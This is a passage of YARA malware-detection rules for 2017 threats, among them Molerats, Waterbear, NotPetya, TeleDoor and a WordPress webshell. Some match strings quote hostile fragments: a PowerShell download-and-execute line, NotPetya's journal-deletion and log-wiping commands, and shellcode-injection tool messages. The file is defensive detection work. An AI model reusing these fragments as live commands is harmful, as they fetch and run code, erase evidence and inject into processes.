condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 1 of ( $x* ) or all of ( $u* ) or 8 of them )\n}\n\nrule Unspecified_Malware_Jul17_1A_RID316B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples of an unspecified malware - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 13:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e1c38142b6194237a4cd4603829aa6edb6436e7bba15e3e6b0c9e8c6b629b42b\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\wuauserv.dll\" fullword ascii\n      $s2 = \"systemroot%\\\\system32\\\\wuauserv.dll\" fullword ascii\n      $s3 = \"ocgen.logIN\" fullword wide\n      $s4 = \"ocmsn.logIN\" fullword wide\n      $s5 = \"Install.log\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )\n}\n\nrule Molerats_Jul17_Sample_1_RID2F9B : APT DEMO EXE FILE G0021 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ebf2423b9de131eab1c61ac395cbcfc2ac3b15bd9c83b96ae0a48619a4a38d0a\"\n      tags = \"APT, DEMO, EXE, FILE, G0021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule Molerats_Jul17_Sample_2_RID2F9C : APT DEMO EXE FILE G0021 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7e122a882d625f4ccac019efb7bf1b1024b9e0919d205105e7e299fb1a20a326\"\n      tags = \"APT, DEMO, EXE, FILE, G0021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Folder.exe\" fullword ascii\n      $s2 = \"Notepad++.exe\" fullword wide\n      $s3 = \"RSJLRSJOMSJ\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule Molerats_Jul17_Sample_3_RID2F9D : APT DEMO EXE FILE G0021 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"995eee4122802c2dc83bb619f8c53173a5a9c656ad8f43178223d78802445131\"\n      hash2 = \"fec657a19356753008b0f477083993aa5c36ebaf7276742cf84bfe614678746b\"\n      tags = \"APT, DEMO, EXE, FILE, G0021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ccleaner.exe\" fullword wide\n      $s2 = \"Folder.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}\n\nrule Molerats_Jul17_Sample_4_RID2F9E : APT DEMO G0021 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"512a14130a7a8b5c2548aa488055051ab7e725106ddf2c705f6eb4cfa5dc795c\"\n      tags = \"APT, DEMO, G0021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"get-itemproperty -path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\' -name 'KeyName')\" wide\n      $x2 = \"O.Run C & chrw(34) & \\\"[System.IO.File]::\" wide\n      $x3 = \"HKCU\\\\SOFTWARE\\\\Microsoft\\\\\\\\KeyName\\\"\" fullword wide\n   condition: \n      ( filesize < 700KB and 1 of them )\n}\n\nrule Molerats_Jul17_Sample_5_RID2F9F : APT DEMO G0021 T1105 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ebf2423b9de131eab1c61ac395cbcfc2ac3b15bd9c83b96ae0a48619a4a38d0a\"\n      tags = \"APT, DEMO, G0021, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell.exe -nop -c \\\"iex\" nocase ascii\n      $x2 = \".run('%windir%\\\\\\\\SysWOW64\\\\\\\\WindowsPowerShell\\\\\\\\\" ascii\n      $a1 = \"Net.WebClient).DownloadString\" nocase ascii\n      $a2 = \"gist.githubusercontent.com\" nocase ascii\n   condition: \n      filesize < 200KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule Molerats_Jul17_Sample_Dropper_RID3246 : APT DEMO EXE FILE G0021 {\n   meta:\n      description = \"Detects Molerats sample dropper SFX - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 13:58:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ad0b3ac8c573d84c0862bf1c912dba951ec280d31fe5b84745ccd12164b0bcdb\"\n      tags = \"APT, DEMO, EXE, FILE, G0021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Please remove %s from %s folder. It is unsecure to run %s until it is done.\" fullword wide\n      $s2 = \"sfxrar.exe\" fullword ascii\n      $s3 = \"attachment.hta\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule Disclosed_0day_POCs_exploit_RID3190 : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:27:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"632d35a0bac27c9b2f3f485d43ebba818089cf72b3b8c4d2e87ce735b2e67d7e\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\exploit.pdb\" ascii\n      $x2 = \"\\\\favorites\\\\stolendata.txt\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule Disclosed_0day_POCs_InjectDll_RID3204 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"173d3f78c9269f44d069afbd04a692f5ae42d5fdc9f44f074599ec91e8a29aa2\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\InjectDll.pdb\" ascii\n      $x2 = \"Specify -l to list all IE processes running in the current session\" fullword ascii\n      $x3 = \"Usage: InjectDll -l|pid PathToDll\" fullword ascii\n      $x4 = \"Injecting DLL: %ls into PID: %d\" fullword ascii\n      $x5 = \"Error adjusting privilege %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule Disclosed_0day_POCs_payload_MSI_RID32BD : DEMO FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 14:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"a7c498a95850e186b7749a96004a98598f45faac2de9b93354ac93e627508a87\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WShell32.dll\" fullword wide\n      $s2 = \"Target empty, so account name translation begins on the local system.\" fullword wide\n      $s3 = \"\\\\custact\\\\x86\\\\AICustAct.pdb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 1000KB and all of them )\n}\n\nrule Disclosed_0day_POCs_injector_RID31E9 : DEMO EXE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ba0e2119b2a6bad612e86662b643a404426a07444d476472a71452b7e9f94041\"\n      tags = \"DEMO, EXE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\injector.pdb\" ascii\n      $x2 = \"Cannot write the shellcode in the process memory, error: \" fullword ascii\n      $x3 = \"/s shellcode_file PID: shellcode injection.\" fullword ascii\n      $x4 = \"/d dll_file PID: dll injection via LoadLibrary().\" fullword ascii\n      $x5 = \"/s shellcode_file PID\" fullword ascii\n      $x6 = \"Shellcode copied in memory: OK\" fullword ascii\n      $x7 = \"Usage of the injector. \" fullword ascii\n      $x8 = \"KO: cannot obtain the SeDebug privilege.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them\n}\n\nrule Disclosed_0day_POCs_lpe_2_RID305D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 12:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b4f3787a19b71c47bc4357a5a77ffb456e2f71fd858079d93e694a6a79f66533\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\cmd.exe\\\" /k wusa c:\\\\users\\\\\" ascii\n      $s2 = \"D:\\\\gitpoc\\\\UAC\\\\src\\\\x64\\\\Release\\\\lpe.pdb\" fullword ascii\n      $s3 = \"Folder Created: \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them )\n}\n\nrule Disclosed_0day_POCs_shellcodegenerator_RID3605 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 16:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"55c4073bf8d38df7d392aebf9aed2304109d92229971ffac6e1c448986a87916\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\shellcodegenerator.pdb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}\n\nrule TeleDoor_Backdoor_RID2DB3 : DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects the TeleDoor Backdoor as used in Petya Attack in June 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/\"\n      date = \"2017-07-05 10:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d462966166450416d6addd3bfdf48590f8440dd80fc571a389023b7c860ca3ac\"\n      hash2 = \"f9d6fe8bd8aca6528dec7eaa9f1aafbecde15fd61668182f2ba8a7fc2b9a6740\"\n      hash3 = \"2fd2863d711a1f18eeee5c7c82f2349c5d4e00465de9789da837fcdca4d00277\"\n      tags = \"DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = { 50 61 79 6C 6F 61 64 00 41 75 74 6F 50 61 79 6C 6F 61 64 } \n      $c2 = { 52 75 6E 43 6D 64 00 44 75 6D 70 44 61 74 61 } \n      $c3 = { 00 5A 76 69 74 57 65 62 43 6C 69 65 6E 74 45 78 74 00 4D 69 6E 49 6E 66 6F } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 2 of them )\n}\n\nrule NotPetya_Ransomware_Jun17_RID30B7 : CRIME DEMO EXE FILE MAL RANSOM T1047 T1053_005 T1218_011 {\n   meta:\n      description = \"Detects new NotPetya Ransomware variant from June 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100\"\n      date = \"2017-06-27 12:51:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745\"\n      hash2 = \"45ef8d53a5a2011e615f60b058768c44c74e5190fefd790ca95cf035d9e1d5e0\"\n      hash3 = \"64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM, T1047, T1053_005, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Ooops, your important files are encrypted.\" fullword wide ascii\n      $x2 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\\\\"C:\\\\Windows\\\\%s\\\\\\\" #1 \" fullword wide\n      $x3 = \"-d C:\\\\Windows\\\\System32\\\\rundll32.exe \\\"C:\\\\Windows\\\\%s\\\",#1 \" fullword wide\n      $x4 = \"Send your Bitcoin wallet ID and personal installation key to e-mail \" fullword wide\n      $x5 = \"fsutil usn deletejournal /D %c:\" fullword wide\n      $x6 = \"wevtutil cl Setup & wevtutil cl System\" ascii\n      $x7 = { 2C 00 23 00 31 00 20 00 00 00 00 00 00 00 00 00 72 00 75 00 6E\n         00 64 00 6C 00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 } \n      $s1 = \"%s /node:\\\"%ws\\\" /user:\\\"%ws\\\" /password:\\\"%ws\\\" \" fullword wide\n      $s4 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n      $s5 = \"schtasks %ws/Create /SC once /TN \\\"\\\" /TR \\\"%ws\\\" /ST %02d:%02d\" fullword wide\n      $s6 = \"u%s \\\\\\\\%s -accepteula -s \" fullword wide\n      $s7 = \"dllhost.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-25 15:44:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \" * @package WordPress\" fullword ascii\n      $s1 = \"define('DB_NAME',\" ascii\n      $s2 = \"require_once(ABSPATH . 'wp-settings.php');\" ascii\n      $fp1 = \"iThemes Security Config\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )\n}\n\nrule Waterbear_1_Jun17_RID2D32 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dd3676f478ee6f814077a12302d38426760b0701bb629f413f7bf2ec71319db5\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\svc.pdb\" ascii\n      $s2 = \"svc.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule Waterbear_2_Jun17_RID2D33 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dcb5c350af76c590002a8ea00b01d862b4d89cccbec3908bfe92fdf25eaa6ea4\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"downloading movie\" fullword ascii\n      $s2 = \"name=\\\"test.exe\\\"/>\" fullword ascii\n      $s3 = \"<description>Test Application</description>\" fullword ascii\n      $s4 = \"UI look 2003\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule Waterbear_4_Jun17_RID2D35 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2e9cb7cadb3478edc9ef714ca4ddebb45e99d35386480e12792950f8a7a766e1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)\" fullword ascii\n      $s1 = \"Wininet.dll InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA HttpQueryInfoA InternetReadFile InternetCloseHandle\" fullword ascii\n      $s2 = \"read from pipe:%s\" fullword ascii\n      $s3 = \"delete pipe\" fullword ascii\n      $s4 = \"cmdcommand:%s\" fullword ascii\n      $s5 = \"%s /c del %s\" fullword ascii\n      $s6 = \"10.0.0.250\" fullword ascii\n      $s7 = \"Vista/2008\" fullword ascii\n      $s8 = \"%02X%02X%02X%02X%02X%02X%04X\" fullword ascii\n      $s9 = \"UNKOWN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}\n\nrule Waterbear_5_Jun17_RID2D36 : DEMO FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d3678cd9744b3aedeba23a03a178be5b82d5f8059a86f816007789a9dd06dc7d\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"ICESWORD\" fullword ascii\n      $a2 = \"klog.dat\" fullword ascii\n      $s1 = \"\\\\cswbse.dll\" ascii\n      $s2 = \"WIRESHARK\" fullword ascii\n      $s3 = \"default_zz|\" fullword ascii\n      $s4 = \"%c4%u-%.2u-%.2u %.2u:%.2u\" fullword ascii\n      $s5 = \"1111%c%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3d53 and filesize < 100KB and ( all of ( $a* ) or 3 of them ) )\n}\n\nrule Waterbear_6_Jun17_RID2D37 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"409cd490feb40d08eb33808b78d52c00e1722eee163b60635df6c6fe2c43c230\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svcdll.dll\" fullword ascii\n      $s2 = \"log.log\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}\n\nrule Waterbear_7_Jun17_RID2D38 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"6891aa78524e442f4dda66dff51db9798e1f92e6fefcdf21eb870b05b0293134\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bluthmon.exe\" fullword wide\n      $s2 = \"Motomon.exe\" fullword wide\n      $s3 = \"%d.%s%d%d%d\" fullword ascii\n      $s4 = \"mywishes.hlp\" fullword ascii\n      $s5 = \"filemon.rtf\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule Waterbear_8_Jun17_RID2D39 : DEMO EXE FILE MAL T1543_003 {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"bd06f6117a0abf1442826179f6f5e1932047b4a6c14add9149e8288ab4a902c3\"\n      hash1 = \"bd06f6117a0abf1442826179f6f5e1932047b4a6c14add9149e8288ab4a902c3\"\n      tags = \"DEMO, EXE, FILE, MAL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Update.dll\" fullword ascii\n      $s2 = \"ADVPACK32.DLL\" fullword wide\n      $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" ascii\n      $s4 = \"\\\\drivers\\\\sftst.sys\" ascii\n      $s5 = \"\\\\\\\\.\\\\SFilter\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}\n\nrule Waterbear_9_Jun17_RID2D3A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:22:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fc74d2434d48b316c9368d3f90fea19d76a20c09847421d1469268a32f59664c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ADVPACK32.DLL\" fullword wide\n      $s2 = \"ADVPACK32\" fullword wide\n      $a1 = \"U2_Dll.dll\" fullword ascii\n      $b1 = \"ProUpdate\" fullword ascii\n      $b2 = \"Update.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of ( $s* ) and ( $a1 or all of ( $b* ) )\n}\n\nrule Waterbear_10_Jun17_RID2D62 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:29:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"3b1e67e0e86d912d7bc6dee5b0f801260350e8ce831c93c3e9cfe5a39e766f41\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ADVPACK32.DLL\" fullword wide\n      $s5 = \"ADVPACK32\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}\n\nrule Waterbear_11_Jun17_RID2D63 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"b046b2e2569636c2fc3683a0da8cfad25ff47bc304145be0f282a969c7397ae8\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/Pages/%u.asp\" fullword wide\n      $s2 = \"NVIDIA Corporation.\" fullword wide\n      $s3 = \"tqxbLc|fP_{eOY{eOX{eO\" fullword ascii\n      $s4 = \"Copyright (C) 2005\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule Waterbear_12_Jun17_RID2D64 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"15d9db2c90f56cd02be38e7088db8ec00fc603508ec888b4b85d60d970966585\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"O_PROXY\" fullword ascii\n      $s2 = \"XMODIFY\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule Waterbear_13_Jun17_RID2D65 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"734e5972ab5ac1e9bc5470c666a55e0d2bd57c4e2ea2da11dc9bf56fb2ea6f23\"\n      hash2 = \"8bde3f71575aa0d5f5a095d9d0ea10eceadba38be888e10d3ca3776f7b361fe7\"\n      hash3 = \"c4b3b0a7378bfc3824d4178fd7fb29475c42ab874d69abdfb4898d0bcd4f8ce1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   